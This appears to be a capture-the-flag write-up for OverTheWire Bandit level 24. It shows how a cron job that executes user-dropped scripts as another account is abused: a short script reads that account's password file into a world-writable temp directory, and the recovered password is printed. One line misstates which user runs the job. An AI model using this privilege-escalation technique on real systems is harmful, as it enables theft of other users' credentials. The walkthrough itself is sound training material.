## Bandit Level 24 — TOBENAMED

### Description

A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

**NOTE**: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2**: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

### Walkthrough

Let’s head into the cron configuration directory:
```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -l
total 28
-rw-r--r-- 1 root root 123 Apr 10 14:16 clean_tmp
-rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit22
-rw-r--r-- 1 root root 122 Apr 10 14:23 cronjob_bandit23
-rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-rwx------ 1 root root  52 Apr 10 14:24 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```
We should read the `cronjob_bandit24` file:
```bash
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
The script `/usr/bin/cronjob_bandit24.sh` is being executed every minute (and at reboot) as user `bandit23`.

Now let’s look at the contents of the script:
```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
* The output of `whoami` command is getting saved in a variable called `myname` (We know this script is being executed as user `bandit24`).
* It changes directory to: `/var/spool/bandit24/foo/`.
* It iterates over all files in that directory, including hidden files (`*` and `.*`), but skips `.` and `..`.
* For each file:
    * It checks if the file's owner is `bandit23`.
    * If so, it executes the file with a 60-second timeout using `timeout -s 9 60` (after 60 seconds, it would send a `SIGKILL` to the process).
    * It then deletes the file, whether it was executed or not.

We could use this behaviour as our favour. Let's write a bash script that reads the password for the next level (stored in `/etc/bandit_pass/bandit24` which we could only read it as user `bandit24`):

```bash
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.5NY7AV73zq
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.5NY7AV73zq
bandit23@bandit:/tmp/tmp.5NY7AV73zq$ vim mkmaster.sh
```
I wrote the script like this:
```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.5NY7AV73zq/pass.out
```
And changed the permission of this directory to allow others to read and write all the files inside it:
```bash
bandit23@bandit:/tmp/tmp.5NY7AV73zq$ touch pass.out
bandit23@bandit:/tmp/tmp.5NY7AV73zq$ chmod 777 -R /tmp/tmp.5NY7AV73zq
```
Now we copy our script to the target directory:
```bash
bandit23@bandit:/tmp/tmp.5NY7AV73zq$ cp mkmaster.sh /var/spool/bandit24/foo/
```
And we wait for a minute; after that we can read `pass.out` to see if our script worked properly or not:
```bash
bandit23@bandit:/tmp/tmp.5NY7AV73zq$ cat pass.out
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
Nice we got the password!